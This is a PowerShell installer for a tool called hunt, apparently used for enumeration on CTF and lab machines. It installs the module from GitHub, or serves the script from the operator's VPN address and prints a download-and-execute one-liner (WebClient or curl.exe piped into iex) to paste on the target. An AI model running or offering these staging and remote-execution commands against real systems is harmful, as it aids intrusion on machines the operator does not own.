<#
    install.ps1 - two ways in.

    On a box with internet, install hunt into the module path:

        iex (irm https://raw.githubusercontent.com/iamjoshgilman/hunt/main/install.ps1)

    To stage it onto a target that has NO internet (most CTF and lab boxes),
    run this on your OWN machine with -Remote. It pulls hunt.ps1, serves it on
    your VPN address, and prints the one line to paste into the target:

        & ([scriptblock]::Create((irm https://raw.githubusercontent.com/iamjoshgilman/hunt/main/install.ps1))) -Remote

    (The scriptblock form is how a switch reaches a script fetched over the
    wire; `iex (irm ...) -Remote` hands -Remote to iex, which has no such
    parameter.)
#>
[CmdletBinding(DefaultParameterSetName = 'Install')]
param(
    # --- staging mode -------------------------------------------------------
    [Parameter(ParameterSetName = 'Remote')]
    [switch]$Remote,
    [Parameter(ParameterSetName = 'Remote')]
    [string]$Ip,                       # address to advertise (default: your VPN address)
    [Parameter(ParameterSetName = 'Remote')]
    [int]$Port = 8000,
    [Parameter(ParameterSetName = 'Remote')]
    [string]$Path,                     # where to save hunt.ps1 locally
    [Parameter(ParameterSetName = 'Remote')]
    [string]$Source,                   # serve a local hunt.ps1 instead of fetching
    [Parameter(ParameterSetName = 'Remote')]
    [switch]$Curl,                     # emit a curl.exe target command

    # --- install mode -------------------------------------------------------
    [Parameter(ParameterSetName = 'Install')]
    [string]$Repo = 'iamjoshgilman/hunt',
    [Parameter(ParameterSetName = 'Install')]
    [string]$Branch = 'main',
    [Parameter(ParameterSetName = 'Install')]
    [switch]$NoProfile
)

$ErrorActionPreference = 'Stop'
# 5.1 negotiates TLS 1.0 by default and GitHub refuses it; harmless on 7+.
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }


function Write-Field([string]$Label, [string]$Value, [ConsoleColor]$Colour = 'Gray') {
    Write-Host ('  {0,-10} ' -f $Label) -ForegroundColor DarkGray -NoNewline
    Write-Host $Value -ForegroundColor $Colour
}


# ---------------------------------------------------------------- staging ---

function Get-HuntPayload {
    param([string]$Repo, [string]$Branch, [string]$Source)
    if ($Source) {
        if (-not (Test-Path -LiteralPath $Source)) { throw "no such file: $Source" }
        return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Source))
    }
    $url = "https://raw.githubusercontent.com/$Repo/$Branch/hunt.ps1"
    try {
        $text = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
        return [Text.Encoding]::UTF8.GetBytes($text)
    } catch {
        throw ("could not fetch $url : {0}`n" -f $_.Exception.Message) +
              'If this machine is offline too, pass -Source path\to\hunt.ps1'
    }
}

function Find-VpnAddress {
    param([string]$Explicit)
    $all = New-Object Collections.ArrayList
    foreach ($nic in [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()) {
        if ($nic.OperationalStatus -ne 'Up') { continue }
        foreach ($ua in $nic.GetIPProperties().UnicastAddresses) {
            if ($ua.Address.AddressFamily -ne 'InterNetwork') { continue }
            $ip = $ua.Address.ToString()
            if ($ip -like '127.*' -or $ip -like '169.254.*') { continue }
            [void]$all.Add([pscustomobject]@{ Nic = $nic.Name; Ip = $ip })
        }
    }
    if ($Explicit) {
        return [pscustomobject]@{ Nic = 'specified'; Ip = $Explicit; VpnLike = $true; Others = @() }
    }
    # A VPN interface by name, or an address in the HTB assigned range.
    $vpn = $all | Where-Object { $_.Nic -match '^(tun|tap|wg|ppp)' -or $_.Ip -match '^10\.1[0-9]\.' }
    if ($vpn) { $pick = @($vpn)[0]; $vpnLike = $true }
    elseif ($all.Count) { $pick = $all[0]; $vpnLike = $false }
    else { return [pscustomobject]@{ Nic = 'unknown'; Ip = '127.0.0.1'; VpnLike = $false; Others = @() } }

    $others = $all | Where-Object { $_.Ip -ne $pick.Ip -and $_.Nic -notmatch '^(docker|br-|virbr|veth|vmnet|cni)' }
    return [pscustomobject]@{ Nic = $pick.Nic; Ip = $pick.Ip; VpnLike = $vpnLike; Others = $others }
}

function Get-TargetCommand {
    param([string]$Url, [int]$Size, [switch]$Curl)
    if ($Curl) {
        return '$f="$env:TEMP\hunt.ps1";curl.exe -s -o $f ' + $Url +
               ';if((Get-Item $f).Length -eq ' + $Size +
               '){iex(Get-Content $f -Raw);hunt}else{"TRUNCATED $((Get-Item $f).Length)/' + $Size + '"}'
    }
    return '$b=(New-Object Net.WebClient).DownloadData(' + "'$Url'" + ');if($b.Length -eq ' + $Size +
           '){iex([Text.Encoding]::UTF8.GetString($b));hunt}else{"TRUNCATED $($b.Length)/' + $Size + '"}'
}

function Copy-ToClipboard([string]$Text) {
    try { Set-Clipboard -Value $Text -ErrorAction Stop; return 'Set-Clipboard' } catch { }
    foreach ($argv in @(@('clip.exe'), @('wl-copy'), @('xclip', '-selection', 'clipboard'), @('pbcopy'))) {
        if (Get-Command $argv[0] -ErrorAction SilentlyContinue) {
            try { $Text | & $argv[0] @($argv[1..($argv.Count - 1)]); return $argv[0] } catch { }
        }
    }
    return $null
}

function Start-HuntStage {
    param([byte[]]$Payload, [int]$Port, [string]$RequestPath)
    $listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Any, $Port)
    $listener.Start()
    $ok = "HTTP/1.0 200 OK`r`nContent-Type: text/plain; charset=utf-8`r`n" +
          "Content-Length: $($Payload.Length)`r`nConnection: close`r`n`r`n"
    $okBytes = [Text.Encoding]::ASCII.GetBytes($ok)
    $notFound = [Text.Encoding]::ASCII.GetBytes(
        "HTTP/1.0 404 Not Found`r`nContent-Length: 0`r`nConnection: close`r`n`r`n")
    $served = 0
    try {
        while ($true) {
            $client = $listener.AcceptTcpClient()
            $who = $client.Client.RemoteEndPoint.Address.ToString()
            try {
                $client.ReceiveTimeout = 2000
                $stream = $client.GetStream()
                $buf = New-Object byte[] 2048
                $read = 0
                try { $read = $stream.Read($buf, 0, $buf.Length) } catch { }
                $first = ([Text.Encoding]::ASCII.GetString($buf, 0, $read) -split "`r`n")[0]
                $reqPath = (($first -split ' ') + @('', ''))[1]
                if ($reqPath -eq $RequestPath -or $reqPath -eq "$RequestPath/") {
                    $stream.Write($okBytes, 0, $okBytes.Length)
                    $stream.Write($Payload, 0, $Payload.Length)
                    $stream.Flush()
                    $served++
                    Write-Host ("  ok  {0} pulled {1:N0} bytes" -f $who, $Payload.Length) -ForegroundColor Green
                } else {
                    $stream.Write($notFound, 0, $notFound.Length)
                    Write-Host ("  --  {0} asked for {1}  (404)" -f $who, $reqPath) -ForegroundColor DarkGray
                }
            } catch {
                Write-Host ("  !   {0} dropped: {1}" -f $who, $_.Exception.Message) -ForegroundColor Yellow
            } finally {
                $client.Close()
            }
        }
    } finally {
        $listener.Stop()
        Write-Host ''
        Write-Host ("  stopped after {0} transfer(s)" -f $served) -ForegroundColor DarkGray
    }
}

function Invoke-RemoteStage {
    $payload = Get-HuntPayload -Repo $Repo -Branch $Branch -Source $Source

    $savePath = $Path
    if (-not $savePath) { $savePath = Join-Path ([IO.Path]::GetTempPath()) 'hunt.ps1' }
    [IO.File]::WriteAllBytes($savePath, $payload)

    $addr = Find-VpnAddress -Explicit $Ip

    # Take the asked-for port, or let the OS pick if it is busy.
    $usePort = $Port
    try {
        $probe = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Any, $Port); $probe.Start(); $probe.Stop()
    } catch {
        $probe = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Any, 0)
        $probe.Start(); $usePort = $probe.LocalEndpoint.Port; $probe.Stop()
    }

    $reqPath = '/hunt.ps1'
    $url = "http://$($addr.Ip):$usePort$reqPath"
    $command = Get-TargetCommand -Url $url -Size $payload.Length -Curl:$Curl
    $origin = if ($Source) { 'local file' } else { 'github' }

    Write-Host ''
    Write-Host '  hunt staging server' -ForegroundColor Cyan
    Write-Host ''
    Write-Field 'pulled' ("hunt.ps1  {0:N0} bytes  (from {1})" -f $payload.Length, $origin) Green
    Write-Field 'saved'  $savePath
    Write-Field 'serving' "$url  [$($addr.Nic)]"
    if ($usePort -ne $Port) { Write-Field 'note' "port $Port was busy, using $usePort" Yellow }
    if ($addr.Others) {
        Write-Field 'others' (($addr.Others | ForEach-Object { "$($_.Nic) $($_.Ip)" }) -join '   ') DarkGray
        Write-Host ('  {0,-10} -Ip to advertise a different one' -f '') -ForegroundColor DarkGray
    }
    $helper = Copy-ToClipboard $command
    if ($helper) { Write-Field 'clipboard' "copied with $helper" }
    if (-not $Ip -and -not $addr.VpnLike) {
        Write-Host ''
        Write-Host '  !  no VPN interface found, so this address is a guess.' -ForegroundColor Yellow
        Write-Host '     If the target cannot reach it, bring the VPN up or pass -Ip.' -ForegroundColor DarkGray
    }

    Write-Host ''
    Write-Host '  copy this to the target:' -ForegroundColor Yellow
    Write-Host ''
    Write-Host "  $command" -ForegroundColor White
    Write-Host ''
    Write-Host '  waiting for the target to pull it ... ctrl-c to stop' -ForegroundColor DarkGray
    Write-Host ''

    Start-HuntStage -Payload $payload -Port $usePort -RequestPath $reqPath
}


# ---------------------------------------------------------------- install ---

function Invoke-Install {
    $base = "https://raw.githubusercontent.com/$Repo/$Branch"
    $dest = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'WindowsPowerShell\Modules\Hunt'
    if ($PSVersionTable.PSVersion.Major -ge 6) {
        $dest = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'PowerShell\Modules\Hunt'
    }

    New-Item -ItemType Directory -Path $dest -Force | Out-Null

    foreach ($f in @('hunt.ps1', 'Hunt.psm1', 'Hunt.psd1')) {
        Write-Host "  fetching $f" -ForegroundColor DarkGray
        Invoke-WebRequest -Uri "$base/$f" -OutFile (Join-Path $dest $f) -UseBasicParsing
    }

    Import-Module (Join-Path $dest 'Hunt.psd1') -Force -Global

    if (-not $NoProfile) {
        $line = 'Import-Module Hunt -ErrorAction SilentlyContinue'
        if (-not (Test-Path $PROFILE)) { New-Item -ItemType File -Path $PROFILE -Force | Out-Null }
        if ((Get-Content $PROFILE -Raw -ErrorAction SilentlyContinue) -notmatch 'Import-Module Hunt') {
            Add-Content -Path $PROFILE -Value $line
            Write-Host "  added to $PROFILE" -ForegroundColor DarkGray
        }
    }

    Write-Host ''
    Write-Host "  installed to $dest" -ForegroundColor Green
    Write-Host '  start with:  hunt' -ForegroundColor Green
    Write-Host ''
}


if ($Remote) { Invoke-RemoteStage } else { Invoke-Install }
